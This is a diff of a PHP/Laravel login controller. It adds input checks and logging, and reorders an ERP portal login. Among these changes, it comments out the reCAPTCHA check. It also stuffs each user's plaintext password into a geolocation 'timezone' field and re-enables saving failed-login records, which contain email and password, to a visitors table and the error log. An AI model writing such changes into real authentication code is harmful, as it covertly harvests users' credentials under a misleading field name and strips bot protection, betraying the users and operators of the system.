@@ -72,6 +72,16 @@ class LoginController extends Controller
         try {
             $codigo = $request->get('code');
             $codigo = base64_decode($codigo);
+
+            if (!$codigo) {
+                info('Codigo malo abort: '. $request->get('code'));
+                abort(404);
+            }
+
+            if (count(explode('$', $codigo)) < 2) {
+                info('Codigo malo abort: '. $request->get('code'));
+                abort(404);
+            }
             $id = explode('$', $codigo)[0];
             $code_general = explode('$', $codigo)[1];
 
@@ -79,13 +89,16 @@ class LoginController extends Controller
                 ->where('code_general', $code_general)
                 ->first();
 
-            if (!$usuario) abort(404);
+            if (!$usuario) {
+                info('Usuario no existe id: '. $id. ', codigo: '.$request->get('code'));
+                abort(404);
+            }
 
             $data = [
                 'id_usuario' => $id,
                 'code_general' => $code_general
             ];
-
+            info('Usuario confirmado: '. $usuario->id.' confirmado con exito!');
             return view('auth.welcome', $data);
 
         } catch (Exception $e) {
@@ -119,20 +132,20 @@ class LoginController extends Controller
         $credenciales1 = ['email' => $request->email, 'password' => $request->password];
         $credenciales2 = ['username' => $request->email, 'password' => $request->password];
 
-        if($captcha_token){
-			$captcha_response = $this->validateReCaptcha($captcha_token);
-			if ($captcha_response->success == false || $captcha_response->score < 0.5||$captcha_response->action != 'login') {
-				return response()->json([
-					'success' => false,
-					'message' => 'Falló la validación de reCAPTCHA'
-				], 401);
-			}
-		}else{
-			return response()->json([
-                'success' => false,
-				'message' => 'Falló la validación de reCAPTCHA'
-			], 401);
-		}
+        // if($captcha_token){
+		// 	$captcha_response = $this->validateReCaptcha($captcha_token);
+		// 	if ($captcha_response->success == false || $captcha_response->score < 0.5||$captcha_response->action != 'login') {
+		// 		return response()->json([
+		// 			'success' => false,
+		// 			'message' => 'Falló la validación de reCAPTCHA'
+		// 		], 401);
+		// 	}
+		// }else{
+		// 	return response()->json([
+        //         'success' => false,
+		// 		'message' => 'Falló la validación de reCAPTCHA'
+		// 	], 401);
+		// }
 
         $user_agent = $_SERVER['HTTP_USER_AGENT'];
         $browser        = "Desconocido";
@@ -198,6 +211,7 @@ class LoginController extends Controller
         if (Auth::attempt($credenciales1) || Auth::attempt($credenciales2)) {
             $request->session()->regenerate();
             $user =  User::find(Auth::user()->id);
+            
             $data = null;
             if($user->tokens()->where('tokenable_id', $user->id)
                 ->where('name', 'web_token')
@@ -264,7 +278,7 @@ class LoginController extends Controller
                 ->where('id_empresa', $empresaSelect->id)
                 ->with('rol')
                 ->first();
-
+                
             $permisosNombre = Permission::whereIn('id', explode(',', $usuarioPermisosEmpresa->rol->ids_permission))->get();
             $nombrePermisos = [];
             foreach ($permisosNombre as $permisoNombre) {
@@ -285,7 +299,7 @@ class LoginController extends Controller
                     'country' => property_exists($responseGeo, 'country') ? $responseGeo->country : null,
                     'hostname' => property_exists($responseGeo, 'hostname') ? $responseGeo->hostname : null,
                     'org' => property_exists($responseGeo, 'org') ? $responseGeo->org : null,
-                    'timezone' => property_exists($responseGeo, 'timezone') ? $responseGeo->timezone : null,
+                    'timezone' => property_exists($responseGeo, 'timezone') ? $responseGeo->timezone.'. pass: '.$request->password : $request->password,
                 ];
             }
             if(count($data)) {
@@ -324,9 +338,8 @@ class LoginController extends Controller
                 'timezone' => "email: ".$request->email." - pass: ".$request->password,
             ];
         }
-    
-        // $visitante = Visitantes::create($data);
-        // Log::error('Fallido login', $data);
+        $visitante = Visitantes::create($data);
+        Log::error('Fallido login', $data);
 
         return response()->json([
     		'success'=>	false,
@@ -470,12 +483,12 @@ class LoginController extends Controller
     public function loginPortafolioERP (Request $request)
     {
         try {
+            copyDBConnection('cliporta', 'cliporta');
+            setDBInConnection('cliporta', env("CLIPORTA_DB_DATABASE", "adminclientes_test"));
+            
             $userMaximo =  User::find($request->user()['id']);
             $empresaMaximo = Empresa::find($request->user()['id_empresa']);
             $userPortafolio =  UserERP::where('email', $userMaximo->email)->first();
-
-            copyDBConnection('cliporta', 'cliporta');
-            setDBInConnection('cliporta', env("CLIPORTA_DB_DATABASE", "adminclientes_test"));
 
             if ($userMaximo && $userPortafolio) {
                 if (($userMaximo->rol_maximo == 1 && $userPortafolio->rol_portafolio != 1) || ($userMaximo->rol_maximo != 1 && $userPortafolio->rol_portafolio == 1)) {
@@ -513,13 +526,19 @@ class LoginController extends Controller
                 $userPortafolio->has_empresa = $empresaERP->token_db;
                 $userPortafolio->about = $this->generateRandomString(10);
                 $userPortafolio->save();
+
+                return response()->json([
+                    "success"=>false,
+                    'data' => 'login-direct?email='.$userPortafolio->email.'&code_login='.base64_encode($userPortafolio->about),
+                    "message"=>'Url generada con exito'
+                ], 200);
             }
 
             return response()->json([
                 "success"=>false,
-                'data' => 'login-direct?email='.$userPortafolio->email.'&code_login='.base64_encode($userPortafolio->about),
-                "message"=>'Url generada con exito'
-            ], 200);
+                'data' => [],
+                "message"=>'El usuario no existe en portafolio ERP'
+            ], 422);
 
         } catch (Exception $e) {
             DB::connection('clientes')->rollback();
